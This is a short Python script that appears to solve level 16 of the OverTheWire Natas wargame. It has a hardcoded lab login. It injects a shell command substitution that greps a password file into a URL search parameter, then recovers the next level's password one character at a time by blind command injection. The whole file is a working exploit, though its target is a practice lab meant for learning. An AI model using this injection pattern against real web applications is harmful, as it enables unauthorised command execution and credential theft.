import requests
from requests.auth import HTTPBasicAuth


alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
pwd = ''
basic_auth = HTTPBasicAuth('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')
url = 'http://natas16.natas.labs.overthewire.org/index.php?needle=jogged'


def create_payload(c) -> str:
    return f'{url}$(grep ^{pwd}{c} /etc/natas_webpass/natas17)'


# filter char exist in password string
for i in range(32):
    for c in alphabet:
        res = requests.get(create_payload(c), auth=basic_auth)
        if 'jogged' not in res.text:
            pwd += c
            break

print(f'password: {pwd}')
